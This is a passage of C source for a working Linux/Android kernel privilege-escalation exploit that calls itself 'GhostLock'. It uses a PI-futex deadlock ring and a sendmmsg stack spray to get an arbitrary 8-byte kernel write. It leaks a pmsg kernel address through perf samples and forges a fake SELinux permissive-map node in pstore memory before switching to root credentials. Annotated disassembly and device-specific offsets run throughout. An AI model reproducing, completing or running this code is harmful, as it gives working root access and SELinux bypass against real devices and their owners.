    if (g_t_nonce[0] && prctl(PR_SET_NAME, (unsigned long)g_t_nonce, 0, 0, 0) != 0)
        L("thr_t: prctl(PR_SET_NAME,'%s') failed errno=%d (R3C will fail closed)",
          g_t_nonce, errno);
    else if (g_t_nonce[0])
        L("thr_t: comm='%s' published (P1)", g_t_nonce);
    /* AF_INET/SOCK_DGRAM created while T is still u:r:shell:s0: the SELinux
     * send check is avc(ssid=current_sid(T), tsid=socket SID=shell,
     * udp_socket, WRITE) and `(allow shell self (udp_socket write))` exists.
     * The send must be issued by T (the waiter lives on T's kernel stack).
     * NOTE: after the cred swap (W9) T's SID becomes kernel(1) and this check
     * has no matching rule -- dev_write8 detects the failed fill and aborts
     * WITHOUT triggering (see SPRAY_DOMAIN_LOST). */
    g_fill_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (g_fill_fd < 0)
        L("thr_t: fill socket(AF_INET,SOCK_DGRAM) failed errno=%d", errno);
    r = futex6(fC, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    t_ready = 1;
    while (!t_go) sched_yield();
    {
        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        ts.tv_sec += 2;
        errno = 0;
        r = futex6(fA, FUTEX_WAIT_REQUEUE_PI, 0, &ts, fB, 0xffffffff);
        (void)r;
    }
    t_done = 1;
    for (;;) {
        int gen;
        while ((gen = spray_gen) == spray_done_gen) {
            if (g_t_quit) goto t_exit;          /* i731: leave, do not spin */
            __asm__ __volatile__("" ::: "memory");
        }
        spray_res = dev_fill_waiter_once();
        __sync_synchronize();
        spray_done_gen = gen;
        if (g_t_quit) break;
    }
t_exit:
    if (g_t_quit) {
        /* i731: hand fC over to O so its FUTEX_LOCK_PI returns and the thread
         * can be joined.  Releasing a PI futex runs mark_wakeup_next_waiter()
         * only -- it never climbs the prio chain, so the stale pi_blocked_on
         * of this task is not walked here. */
        futex6(fC, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        g_t_unlocked = 1;
    }
    return NULL;
}

static void *thr_o(void *arg)
{
    (void)arg;
    pin_cpu(2);
    o_tid = (pid_t)syscall(SYS_gettid);
    futex6(fB, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    o_ready = 1;
    while (!o_go) sched_yield();
    futex6(fC, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    while (!g_o_quit) sched_yield();        /* i731: joinable */
    return NULL;
}

static void *thr_h(void *arg)
{
    (void)arg;
    pin_cpu(3);
    h_tid = (pid_t)syscall(SYS_gettid);
    futex6(fD, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    h_ready = 1;
    while (!g_h_quit) sched_yield();        /* i731: joinable */
    return NULL;
}

static int ring_setup(void)
{
    pthread_t a, b, c;
    int i;
    fA = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    fB = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    fC = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    fD = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (fA == MAP_FAILED || fB == MAP_FAILED || fC == MAP_FAILED || fD == MAP_FAILED)
        return -1;
    *fA = *fB = *fC = *fD = 0;
    if (pthread_create(&c, NULL, thr_h, NULL)) return -1;
    if (pthread_create(&a, NULL, thr_t, NULL)) return -1;
    if (pthread_create(&b, NULL, thr_o, NULL)) return -1;
    g_thr_h = c; g_thr_t = a; g_thr_o = b;      /* i731 */
    for (i = 0; i < 2000 && !(h_ready && t_ready && o_ready); i++) msleep(2);
    if (!(h_ready && t_ready && o_ready)) return -1;
    t_go = 1;
    msleep(300);
    o_go = 1;
    msleep(400);
    if (futex6(fA, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, fB, 0) != -1 || errno != EDEADLK)
        L("ring: CMP_REQUEUE_PI did not return EDEADLK (errno=%d)", errno);
    for (i = 0; i < 2000 && !t_done; i++) msleep(2);
    if (!t_done) return -2;
    msleep(200);
    /* P1: refill W's pi_state_cache from the freed object */
    futex6(fD, FUTEX_TRYLOCK_PI, 0, NULL, NULL, 0);
    msleep(100);
    L("ring ready: t_tid=%d o_tid=%d h_tid=%d (victim CPU%d, main CPU%d)",
      t_tid, o_tid, h_tid, g_t_cpu, g_main_cpu);
    return 0;
}

/* ==========================================================================
 * i731 (intent 738) -- post-shot hardening
 *
 * WHY (instruction-level, C.53 vmlinux.elf):
 *   rt_mutex_adjust_prio_chain @0xffffffc010412e5c is reachable from exactly
 *   three call sites (xref of BL at 0x412e40 / 0x4140f4 / 0x4144b4):
 *     rt_mutex_adjust_pi (from __sched_setscheduler+0x7dc), task_blocks_on_
 *     rt_mutex (rt_mutex_slowlock / __rt_mutex_start_proxy_lock) and
 *     remove_waiter (futex_lock_pi abort / unlock paths).
 *   After a shot the fake lock in the pmsg page keeps rb_leftmost pointing at
 *   the waiter that lives on T's kernel stack:
 *     0x412ff4  ldr x8,[x24,#0x10]      ; lock->waiters.rb_leftmost
 *     0x412ff8  cbz x8, 0x41334c        ; empty  -> benign exit
 *     0x412ffc  ldr x9,[x8,#0x38]       ; w->lock
 *     0x413004  cmp x9, x24
 *     0x413008  b.ne 0x413224           ; BUG_ON(w->lock != lock) -> brk #0x800
 *   So ANY later climb over that fake lock (a second sched_setscheduler on T,
 *   or O's futex_lock_pi being aborted / fC being released) re-dereferences the
 *   stale stack slot: intact => a silent second 8-byte write, damaged => the
 *   BUG_ON above => oops => PANIC_ON_OOPS self-reset.  That is an asynchronous
 *   amplifier, which is why the reset points wander (run62: before SETIDS
 *   begin; run61: after setresgid rc=0; run44: after setresgid EPERM).
 *
 * MITIGATION (both halves are needed):
 *   (a) pmsg_purge_fake_lock(): one last full-image write AFTER the final shot
 *       re-zeroes the fake lock, so lock->waiters.rb_leftmost == 0 and every
 *       later climb takes the 0x412ff8 cbz -> 0x41334c benign path
 *       (0x41300c RB_EMPTY_NODE check also skips the dequeue).  The ebitmap
 *       node keeps next==0 (image and memory are both 0, so no partial copy
 *       can ever make it non-zero) and startbit=0x580/maps[0]=1<<56 still
 *       covers SID 1464, so the per-SID permissive map stays valid.
 *   (b) ring_quiesce(): stop T, hand fC to O, stop O/H and join all three, so
 *       the only walker left (O's remove_waiter on an aborted lock) is gone and
 *       /proc/self/task shows exactly one thread before SETIDS.
 * ========================================================================== */
static int pmsg_purge_fake_lock(void)
{
    if (!g_pmsg_ready) {
        L("POSTSHOT_PURGE: pmsg ring not ready -- nothing to purge");
        return 0;
    }
    if (pmsg_write_img() != 0) {
        L("POSTSHOT_PURGE: FAILED (pmsg refill error) -- stale fake-lock tree "
          "survives; a later PI climb may BUG_ON");
        return -1;
    }
    L("POSTSHOT_PURGE: fake lock @ %#lx re-zeroed after the final shot "
      "(rb_leftmost=0 => 0x412ff8 cbz -> 0x41334c benign; node->next stays 0)",
      g_fake_lock);
    return 0;
}

/* thread count of this process, parsed from /proc/self/status (no dirent) */
static int task_count_self(void)
{
    char b[2048];
    int fd, n, i;
    fd = open("/proc/self/status", O_RDONLY);
    if (fd < 0) return -1;
    n = (int)read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -1;
    b[n] = 0;
    for (i = 0; i + 8 < n; i++) {
        if (!strncmp(b + i, "Threads:", 8))
            return atoi(b + i + 8);
    }
    return -1;
}

static void join_bounded(pthread_t t, const char *nm)
{
    int i;
    for (i = 0; i < 400; i++) {
        if (pthread_tryjoin_np(t, NULL) == 0) {
            L("QUIESCE %s: joined after %dms", nm, i);
            return;
        }
        msleep(1);
    }
    L("QUIESCE %s: NOT joinable within 400ms -- continuing without it "
      "(a later PI climb over the fake lock is still defused by the purge)", nm);
}

/* Returns the thread count seen AFTER the joins (1 = single-threaded). */
static int ring_quiesce(void)
{
    int before = task_count_self(), after;
    L("QUIESCE begin: threads=%d (want 1 before SETIDS)", before);
    g_t_quit = 1;
    for (int i = 0; i < 500 && !g_t_unlocked; i++) msleep(1);
    L("QUIESCE T: unlocked fC=%d", g_t_unlocked);
    g_o_quit = 1;
    g_h_quit = 1;
    join_bounded(g_thr_t, "T");
    join_bounded(g_thr_o, "O");
    join_bounded(g_thr_h, "H");
    after = task_count_self();
    L("QUIESCE done: threads=%d", after);
    return after;
}

/* Seal: no shot may follow; purge the fake lock; join every helper thread. */
static int seal_primitive(void)
{
    g_shots_sealed = 1;
    L("POSTSHOT_SEAL: shot guard armed (dev_write8 now returns -7); "
      "no sched_setattr/futex/pthread work except this teardown");
    if (g_no_purge) L("POSTSHOT_PURGE: skipped (--no-purge)");
    else            pmsg_purge_fake_lock();
    if (g_no_quiesce) {
        L("QUIESCE: skipped (--no-quiesce); thread count=%d", task_count_self());
        g_quiesce_tasks = task_count_self();
        return 0;
    }
    g_quiesce_tasks = ring_quiesce();
    return g_quiesce_tasks;
}

/* ==========================================================================
 * i739 (intent 754) -- MINIMAL-RISK SETIDS  (raw syscalls, no broadcast)
 *
 * WHY (C.53 vmlinux.elf + the static glibc inside this very binary):
 *
 * 1) capable() -> selinux_capable() is NOT a per-SID-map consumer after the
 *    first decision.  selinux_capable @0xffffffc0101035e8:
 *      avc_lookup            [0x103694]
 *      hit  -> memcpy(avd)   [0x1036a8] -> test perm bit -> avc_denied
 *              [0x103778] on a deny; security_compute_av is NOT called.
 *      miss -> avc_compute_av[0x1037a8] -> security_compute_av @0x107494,
 *              where ebitmap_get_bit is inlined [0x107600..0x107644]:
 *                ldr w11,[policydb+472]   ; permissive_map.highbit
 *                ldr x11,[policydb+464]   ; permissive_map.node
 *                ldr w12,[x11,#56]        ; node->startbit
 *                ... ldr x11,[x11]        ; node->next (0 for our fake node)
 *                add #0x180 / cmp / brk #0x800 @0x107978 (bounds BUG_ON)
 *                ldr x11,[x11+8+8*idx]    ; node->maps[]
 *    The SETID_GATE setgroups(0) is the first capability-class check after
 *    the whole-map arm (the WC shots make CAP_SYS_NICE pass and are the first
 *    ones to reach SELinux), so the (shell,shell,CAPABILITY) node is computed
 *    once; every later capable() -- including the one inside setresgid -- is
 *    a cache HIT.  => A partially armed / silent-no-op fake node can only
 *    produce (a) EPERM at SETID_GATE (clean abort, 0 shots) or (b) a brk
 *    #0x800 inside the first walk, i.e. BEFORE the "RES|PASS|SETID_GATE" line.
 *    It cannot explain a panic that happens after that line (run62 / run61).
 * 2) The only remaining consumer of GhostLock residue in the SETIDS window is
 *    the glibc NPTL setxid broadcast:
 *      __setresgid @0x435610 reads __libc_single_threaded; with T/O/H alive
 *      that byte is 0 -> bl __nptl_setxid @0x4356a8.  __nptl_setxid marks
 *      every other thread and tgkill(tid, SIGSETXID=33) them
 *      [0x466130 / 0x46619c, x8=131].  Those threads are parked in the PI
 *      futexes of the GhostLock ring; the signal aborts futex_lock_pi ->
 *      rt_mutex_cleanup_proxy_lock -> remove_waiter @0x414690 ->
 *      rt_mutex_adjust_prio_chain @0x412e5c, whose first hop dereferences
 *      task->pi_blocked_on at task+0x918 [0x412ed0] and waiter->lock at
 *      waiter+0x38 [0x412ef0] -- the very stack slot the sendmmsg fill
 *      rewrites -- and then put_pi_state()/free_pi_state() runs on the aborted
 *      PI-futex state that the intentionally created deadlock ring left behind.
 *    => issue NO signal at all: raw setresgid/setresuid (svc 149/147) and a
 *       fail-closed single-thread precondition.  p11h already quiesces T/O/H
 *       after the last shot, so no other thread's cred needs the broadcast.
 * ========================================================================== */
#ifdef GLX_UT
/* definitions live with the other GLX_UT seams below */
extern int (*ut_setids_syscall_hook)(long nr, long a, long b, long c);
extern int ut_task_count_override;
#endif

static int setids_threads_now(void)
{
#ifdef GLX_UT
    if (ut_task_count_override > 0) return ut_task_count_override;
#endif
    return task_count_self();
}

/* -1 = the primitive is not sealed (a shot could still follow -> refuse)
 * -2 = Threads != 1 and multi-thread SETIDS was not explicitly allowed
 *  0 = ok  */
static int setids_precheck(int *threads_out)
{
    int t = setids_threads_now();
    if (threads_out) *threads_out = t;
    if (!g_shots_sealed) return -1;
    if (t != 1 && !g_allow_mt_setids && !g_no_quiesce) return -2;
    return 0;
}

static long setids_syscall(long nr, long a, long b, long c)
{
#ifdef GLX_UT
    if (ut_setids_syscall_hook) return ut_setids_syscall_hook(nr, a, b, c);
#endif
    return syscall(nr, a, b, c);
}

/* Fake rt_mutex_waiter (0x50 B): only fields consumed by rb_erase /
 * adjust_prio_chain are set. */
/* T's live dynamic priority (field 18 of /proc/<tid>/stat, after the comm
 * field).  Returns 120 (T's normal prio) if the file cannot be parsed. */
static int dev_t_prio(void)
{
    char path[64], b[512], *q;
    int fd, n, i, v;
    snprintf(path, sizeof(path), "/proc/self/task/%d/stat", (int)t_tid);
    fd = open(path, O_RDONLY);
    if (fd < 0) return 120;
    n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return 120;
    b[n] = 0;
    q = strrchr(b, ')');
    if (!q) return 120;
    q++;
    /* after ')': state(1) ppid(2) ... priority(16) */
    for (i = 0; i < 16; i++) {
        while (*q == ' ') q++;
        if (i == 15) {
            v = atoi(q);
            return (v > 0 && v < 200) ? v : 120;
        }
        while (*q && *q != ' ') q++;
    }
    return 120;
}

static void build_spray(unsigned long target, unsigned long value)
{
    /* fact 569: publish the two variables T turns into the head of sa[] and
     * the tail of v1[].  The waiter->task choice is unchanged from glx_p2
     * (fact 562): rt_mutex_adjust_prio_chain reads waiter->task exactly once,
     * in the tail wake_up_process(top_waiter->task) AFTER the 8B write, and
     * try_to_wake_up(init_task) returns at the state test (init_task+0x28=0)
     * after only touching init_task+0x8f4 (pi_lock).  A_init_task is derived
     * before R1, so no chicken-and-egg. */
    g_spray_target = target;
    g_spray_value = value;
}

/* Glue between main and T.  Ordering matters:
 *   1) re-zero the pmsg fake rt_mutex (main's syscall, separate stack);
 *   2) publish target/value and wake T;
 *   3) T's sendmmsg fill must return 1 -- if it does not, the kernel stack
 *      slot was NOT filled and triggering sched_setattr would dereference a
 *      stale/NULL waiter->lock (oops -> PANIC_ON_OOPS -> board self-resets).
 *      We therefore abort the shot cleanly instead of triggering;
 *   4) trigger immediately (no sleep) to keep the EL0 window (fact 324) as
 *      short as possible. */
static int dev_write8(unsigned long target, unsigned long value)
{
    int gen, i, pol;
    if (shot_guard() != 0) {                /* i731: sealed after the last shot */
        L("dev_write8: REFUSED -- the primitive is sealed (post-shot phase); "
          "target=%016lx value=%016lx NOT issued", target, value);
        return -7;
    }
    if (!is_kptr(A_init_task) || !is_kptr(g_fake_lock) ||
        !is_kptr(target) || (g_fake_lock & 7)) {
        L("dev_write8: not ready (init_task=%lx fake_lock=%lx target=%lx)",
          A_init_task, g_fake_lock, target);
        return -1;
    }
    if (g_pmsg_refill) {
        if (!g_pmsg_ready) { L("dev_write8: pmsg ring not ready"); return -4; }
        if (pmsg_write_img() != 0) { L("dev_write8: pmsg refill failed"); return -5; }
    }
    build_spray(target, value);
    /* fact 531: if waiter->prio == T's p->prio the chain returns early (silent
     * no-op).  The template uses prio=0; T's normal prio is 120, so this is
     * only a warning -- and dev_t_prio() falls back to 120 when /proc is
     * unreadable after the cred swap. */
    if (dev_t_prio() == 0)
        L("dev_write8: WARN T prio==0; waiter->prio=0 would make this a no-op");
    spray_res = -1;
    spray_errno = 0;
    gen = ++spray_gen;
    for (i = 0; i < 400 && spray_done_gen != gen; i++) msleep(1);
    if (spray_done_gen != gen) { L("dev_write8: fill timeout"); return -2; }
    __sync_synchronize();               /* pair with T's release barrier */
    if (spray_res != 0) {
        L("dev_write8: SPRAY_DOMAIN_LOST target=%016lx value=%016lx "
          "sendmmsg!=1 errno=%d -- fill did not reach stack_base+0x3C80; "
          "NOT triggering (would oops)", target, value, spray_errno);
        return -6;
    }
    /* policy MUST change or rt_mutex_adjust_pi() is never called; only record
     * the toggle when the syscall succeeded (fact 563 M-item). */
    pol = g_t_policy ? 0 : 3;          /* 0 = SCHED_NORMAL, 3 = SCHED_BATCH */
    errno = 0;
    if (gl_sched_setscheduler(t_tid, pol) != 0) {
        L("dev_write8: sched_setattr(policy=%d) errno=%d", pol, errno);
        return -3;
    }
    g_t_policy = pol;
    msleep(5);
    g_shots++;
    L("SHOT %d DEV w8 target=%016lx value=%016lx", g_shots, target, value);
    return 0;
}
static void dev_write8_prepare(void) { }
/* --------------------------------------------------------------- pmsg leak */
static unsigned long g_vmap_base, g_vmap_obj, g_vmap_size;
/* i510 pmsg fake-lock state */
static unsigned char pmsg_img[1 << 20];
static unsigned long g_pmsg_cursor;     /* leaked write-dest offset, 0 = unknown */
static int g_pmsg_ready;                /* ring holds our uniform fill         */
static int g_pmsg_refill = 1;           /* re-zero before every write shot     */
static int g_pmsg_refills;

static int pmsg_img_fake_lock_at(unsigned long off)
{
    const unsigned long *w;
    if ((off & 7) || off + PMSG_OBJ_SIZE > PMSG_DATA_LEN) return 0;
    w = (const unsigned long *)(pmsg_img + off);
    /* wait_lock(4)+pad, rb_node, rb_leftmost, owner must all be zero */
    return w[0] == 0 && w[1] == 0 && w[2] == 0 && w[3] == 0;
}

/* Write the whole persistent_ram data area in one write().  count ==
 * buffer_size, so persistent_ram_write_user() splits it into exactly two
 * __copy_from_user() calls that together cover [start..end) U [0..start):
 * every byte of the data area is ours regardless of the ring cursor. */
static int pmsg_write_img(void)
{
    int fd = open("/dev/pmsg0", O_WRONLY);
    ssize_t n;
    if (fd < 0) { L("pmsg: refill open failed errno=%d", errno); return -1; }
    n = write(fd, pmsg_img, PMSG_DATA_LEN);
    close(fd);
    g_pmsg_refills++;
    return n == (ssize_t)PMSG_DATA_LEN ? 0 : -2;
}

static int dev_pmsg_leak(void)
{
    int fd, i, tries, j;
    static unsigned char buf[1 << 20];
    long counts[64];
    unsigned long bases[64];
    int nb = 0;
    int period = 20000;
    unsigned long xv[64];
    long xcnt[64];
    int nx = 0, bx = -1;
    unsigned long last_x0 = 0;

    /* i510: uniform zero fill -- every 8-aligned address inside the data area
     * is then a complete legal fake rt_mutex. */
    memset(pmsg_img, 0, sizeof(pmsg_img));
    memset(buf, 0, sizeof(buf));

    fd = open("/dev/pmsg0", O_WRONLY);
    if (fd < 0) { L("pmsg: open failed errno=%d", errno); return -1; }

    for (tries = 0; tries < 5; tries++) {
        time_t t0;
        long nk = 0;                    /* kernel-IP samples = ratio denominator */
        if (perf_start(period, RING_PAGES_PMSG) < 0) {
            L("pmsg: perf unavailable (errno=%d)", errno);
            close(fd);
            return -2;
        }
        memset(counts, 0, sizeof(counts));
        memset(xcnt, 0, sizeof(xcnt));
        nb = 0; nx = 0;
        t0 = time(NULL);
        while (time(NULL) - t0 < 2) {
            if (write(fd, buf, 0xFFFF4) < 0) break;
            syscall(SYS_getpid);
        }
        perf_stop(RING_PAGES_PMSG);
        close(fd);
        for (i = 0; i < g_nsamp; i++) {
            unsigned long ip = g_samp[i].ip, x0 = g_samp[i].regs[0];
            unsigned long base;
            if (!is_kptr(ip)) continue;
            nk++;
            if (x0 < VWINDOW_LO || x0 >= VWINDOW_HI) continue;
            /* fact 539: the data area starts at base+0xC, so a genuine
             * __arch_copy_from_user destination inside the ring has a
             * non-zero low 20 bits >= 0xC.  Anything else is a stray. */
            if ((x0 & 0xfffffUL) < 0xC) continue;
            {
                int k;
                for (k = 0; k < nx; k++) if (xv[k] == x0) break;
                if (k == nx && nx < 64) { xv[nx] = x0; xcnt[nx] = 0; nx++; }
                if (k < nx) xcnt[k]++;
            }
            base = x0 & ~0xfffffUL;
            for (j = 0; j < nb; j++) if (bases[j] == base) break;
            if (j == nb && nb < 64) { bases[nb] = base; counts[nb] = 0; nb++; }
            if (j < nb) counts[j]++;
        }
        fd = open("/dev/pmsg0", O_WRONLY);
        if (fd < 0) return -1;
        {
            int best = -1; long bc = 0;
            for (j = 0; j < nb; j++) if (counts[j] > bc) { bc = counts[j]; best = j; }
            if (best >= 0 && nk > 0)
                L("pmsg: attempt %d samples=%d kernel=%ld base=%016lx hits=%ld (%.1f%%)",
                  tries + 1, g_nsamp, nk, bases[best], bc, 100.0 * (double)bc / (double)nk);
            else
                L("pmsg: attempt %d no base (samples=%d nb=%d)", tries + 1, g_nsamp, nb);
            /* i492: accept only at >=90% hit rate over kernel samples (device
             * reference 3434/3530 = 97.3%, fact 492); otherwise sample longe
             * on the next attempt -- never relax the power-of-two ring. */
            if (best >= 0 && bc >= 2 && nk > 0 && bc * 10 >= nk * 9) {
                g_vmap_base = bases[best];
                L("pmsg: base=%016lx hits=%ld/%ld attempt=%d",
                  g_vmap_base, bc, nk, tries + 1);
                break;
            }
        }
    }
    close(fd);
    if (!g_vmap_base) { L("pmsg: NO BASE -> hard abort (never blind-write)"); return -3; }
    /* use the MODE of the exact x0 values in the window: every full-ring write
     * copies to the same destination (cursor unchanged), so the true write
     * head dominates; a stray sample that merely happens to contain an address
     * inside the vmap cannot win. */
    {
        int k;
        long c;
        for (k = 0, c = 0; k < nx; k++)
            if (xcnt[k] > c) { c = xcnt[k]; bx = k; }
        if (bx >= 0) {
            last_x0 = xv[bx];
            L("pmsg: write-head x0=%016lx (%ld samples)", last_x0, c);
        }
    }
    /* intent 662: recover the ring start S.  A full-size write copies at
     * base+0xC+S (head, size-S bytes) and then at base+0xC (wrap, S bytes), so
     * the largest in-window x0 that was sampled more than once is the head;
     * only base+0xC means S==0 or the head copy was never sampled
     * (ambiguous -> refuse to arm). */
    {
        unsigned long maxlow = 0;
        int k2;
        for (k2 = 0; k2 < nx; k2++) {
            unsigned long v = xv[k2], low;
            if (v < g_vmap_base || v - g_vmap_base >= PMSG_DATA_LEN) continue;
            if (xcnt[k2] < 2) continue;
            low = v & 0xFFFFFUL;
            if (low > maxlow) maxlow = low;
        }
        if (maxlow > 0xC) {
            g_pmsg_start = (int)(maxlow - 0xC);
            g_pmsg_start_certain = 1;
        } else {
            g_pmsg_start = 0;
            g_pmsg_start_certain = 0;
        }
        L("pmsg: ring start S=%d (certain=%d, max sampled low=%#lx)",
          g_pmsg_start, g_pmsg_start_certain, maxlow);
    }

    /* fact 539: anchor the fake rt_mutex to the 1MB-masked vmap base, not to
     * the leaked write head.  x0 = base + 0xC + ring_start, so the ring cursor
     * S moves but the base does not.  obj = base + 0x2000 gives data offset
     * 0x1FF4 (8-aligned), is 100% inside the 0xFFFF4 data area, and one
     * uniform write(0xFFFF4) zero-fill covers the whole ring for any S.
     * "write head + 0x80000" is FORBIDDEN: on the device that lands outside
     * the 1MB window about 50% of the time (fact 539). */
    {
        unsigned long off = PMSG_OBJ_OFF;
        unsigned long low = last_x0 & 0xFFFFFUL;
        g_pmsg_cursor = 0;
        if ((g_vmap_base & 0xFFFFFUL) != 0) {
            L("pmsg: ABORT base=%016lx is not 1MB aligned", g_vmap_base);
            return -4;
        }
        if (last_x0 >= g_vmap_base && last_x0 - g_vmap_base < PMSG_DATA_LEN)
            g_pmsg_cursor = last_x0 - g_vmap_base;
        if (last_x0 && (low < 0xC || low >= 0x100000UL))
            L("pmsg: WARN leaked x0=%016lx low=%#lx outside [0xC,0x100000)",
              last_x0, low);
        if ((off & 7) || off < 0x40 || off + PMSG_OBJ_SIZE > PMSG_DATA_LEN) {
            L("pmsg: ABORT obj off=%#lx out of window", off);
            return -5;
        }
        if (!pmsg_img_fake_lock_at(off)) {
            L("pmsg: ABORT local image at off=%#lx is not a legal fake rt_mutex", off);
            return -5;
        }
        g_vmap_obj = g_vmap_base + off;
        L("pmsg: obj anchored at base+%#lx (leaked cursor=%#lx x0=%016lx low=%#lx)",
          off, g_pmsg_cursor, last_x0, low);
    }
    /* make sure the ring really holds our uniform fill before any shot */
    if (pmsg_write_img() != 0) { L("pmsg: refill failed"); return -6; }
    g_pmsg_ready = 1;
    L("pmsg: base=%016lx obj=%016lx off=%#lx cursor=%#lx (uniform-zero fill, %lu bytes)",
      g_vmap_base, g_vmap_obj, g_vmap_obj - g_vmap_base, g_pmsg_cursor,
      PMSG_DATA_LEN);
    return 0;
}

/* ---------------- intent 662: pmsg-resident fake ebitmap_node --------------
 * /dev/pmsg0 is a pstore/ramoops ring (fs/pstore/pmsg.c -> ramoops_pstore_
 * write_user -> persistent_ram_write_user).  A write whose count equals the
 * data area (0xFFFF4) copies the whole user buffer in exactly two
 * __copy_from_user() calls that cover [start..end) U [0..start), so EVERY byte
 * of struct persistent_ram_buffer.data is replaced by user bytes; image index
 * i lands at ring offset (S+i) mod 0xFFFF4 where S = buffer->start (which a
 * full-size write does NOT change: buffer_start_add(old+size) wraps back to
 * old).  S is recovered from the perf REGS_INTR leak of __copy_from_user's x0:
 * the two destinations are base+0xC (wrap copy) and base+0xC+S (head copy), so
 * S = max(low20(x0)) - 0xC when the head copy was sampled; if only base+0xC
 * was sampled the value is ambiguous and the chain refuses to arm.
 * The node is placed at vmap base+0x100 => ring data offset 0xF4 => image index
 * (0xF4 - S) mod 0xFFFF4.  pmsg_write_img() re-writes this same image before
 * every shot, which is what restores node->next=0 after W_node's secondary
 * store and keeps the node stable for the rest of the session. */
static void perm_img_put(unsigned long idx, const unsigned char *src,
                         unsigned long n)
{
    unsigned long i, sz = PMSG_DATA_LEN;
    for (i = 0; i < n; i++) pmsg_img[(idx + i) % sz] = src[i];
}

/* image index that maps to a given vmap offset inside the pmsg window */
static unsigned long perm_img_index(unsigned long vmap_off)
{
    unsigned long r, s;
    if (g_pmsg_start < 0 || (unsigned long)g_pmsg_start >= PMSG_DATA_LEN)
        return ~0UL;
    if (vmap_off < 0xC) return ~0UL;
    r = vmap_off - 0xC;                     /* ring data offset */
    s = (unsigned long)g_pmsg_start;
    return (r + (PMSG_DATA_LEN - s)) % PMSG_DATA_LEN;
}

static int perm_encode_node(void)
{
    unsigned char nd[0x40];
    unsigned long next = 0, maps[6];
    unsigned int sb = (unsigned int)PERM_STARTBIT;
    unsigned long idx, lock_idx, i;

    if (!g_pmsg_ready || !is_kptr(g_vmap_base)) return -1;
    if (g_pmsg_start < 0 || (unsigned long)g_pmsg_start >= PMSG_DATA_LEN) return -2;
    if (PERM_NODE_VMAP_OFF < 0xC ||
        PERM_NODE_VMAP_OFF - 0xC + 0x40 > PMSG_DATA_LEN) return -3;
    idx = perm_img_index(PERM_NODE_VMAP_OFF);
    lock_idx = perm_img_index(PMSG_OBJ_OFF);
    if (idx == ~0UL || lock_idx == ~0UL) return -3;
    /* the fake rt_mutex (0x20 bytes at ring 0x2000) must stay all-zero:
     * check the whole 0x40-byte node range against the whole 0x20-byte lock
     * range (mod the ring) instead of just the lock's first byte. */
    for (i = 0; i < 0x40; i++) {
        unsigned long j;
        for (j = 0; j < PMSG_OBJ_SIZE; j++)
            if ((idx + i) % PMSG_DATA_LEN == (lock_idx + j) % PMSG_DATA_LEN)
                return -4;
    }
    memset(pmsg_img, 0, sizeof(pmsg_img));
    memset(nd, 0, sizeof(nd));
    memset(maps, 0, sizeof(maps));
    maps[PERM_SHELL_BIT / 64] |= 1UL << (PERM_SHELL_BIT % 64);
#if PERM_UA27_PERMISSIVE
    maps[PERM_UA27_BIT / 64] |= 1UL << (PERM_UA27_BIT % 64);
#endif
    memcpy(nd + 0x00, &next, 8);            /* next = NULL (chain terminates) */
    memcpy(nd + 0x08, maps, 48);            /* maps[0..5]                     */
    memcpy(nd + 0x38, &sb, 4);              /* startbit = 1408                */
    perm_img_put(idx, nd, 0x40);
    g_perm_img_idx = idx;
    return 0;
}

static void perm_dwell(void)
{
    if (g_perm_dwell_s <= 0) return;
    L("PERM_DWELL %d s begin (uid=%d euid=%d)", g_perm_dwell_s, getuid(), geteuid());
    sleep((unsigned int)g_perm_dwell_s);
    L("PERM_DWELL done uid=%d euid=%d (process survived the dwell)", getuid(), geteuid());
}

/* --------------------------------------------------------------- profiles */
static void profile_device(void)
{
    A_text = D_TEXT + D; A_init_cred = D_INIT_CRED + D;
    A_init_task = D_INIT_TASK + D; A_state = D_STATE + D;
    A_pco = D_PCO + D; A_rq = D_RUNQUEUES + D;
    A_tcp_ent = D_TCP_ENT + D; A_oops_cxt = D_OOPS_CXT + D;
    off_real = D_OFF_REAL; off_cred = D_OFF_CRED; off_comm = D_OFF_COMM;
    off_ptracer = D_OFF_PTRACER; rq_curr_off = D_RQ_CURR; cred_euid = D_CRED_EUID;
}

/* ------------------------------------------------------------ D solve (dev) */
static int dev_solve_D(void)
{
    static uint64_t ips[16384];
    int nips = 0, i, found = 0;
    uint64_t best = 0;
    time_t t0;
    int pfd[2], statfd;
    unsigned char sink[4096];
    unsigned long it = 0;

    if (perf_start(50000, RING_PAGES_D) < 0) return -1;
    pipe(pfd);
    statfd = open("/proc/self/stat", O_RDONLY);
    t0 = time(NULL);
    while (time(NULL) - t0 < 3) {
        it++;
        if (statfd >= 0) { lseek(statfd, 0, SEEK_SET); read(statfd, sink, sizeof(sink)); }
        write(pfd[1], sink, sizeof(sink)); read(pfd[0], sink, sizeof(sink));
        syscall(SYS_getpid);
    }
    close(statfd); close(pfd[0]); close(pfd[1]);
    perf_stop(RING_PAGES_D);
    for (i = 0; i < g_nsamp; i++)
        if (is_kptr(g_samp[i].ip) && nips < 16384)
            ips[nips++] = g_samp[i].ip;
    if (nips < 8) { L("D: too few kernel samples (%d)", nips); return -2; }
    {
        /* device evidence for the REGS_INTR layout fix: regs[0] must be a real
         * x0 (kernel/user pointer), never the constant abi word 2. */
        int shown = 0, k;
        for (k = 0; k < g_nsamp && shown < 3; k++) {
            if (!is_kptr(g_samp[k].ip)) continue;
            L("D sample[%d] ip=%016lx x0=%016lx sp=%016lx",
              shown, g_samp[k].ip, g_samp[k].regs[0], g_samp[k].regs[31]);
            shown++;
        }
    }
    {
        uint64_t k;
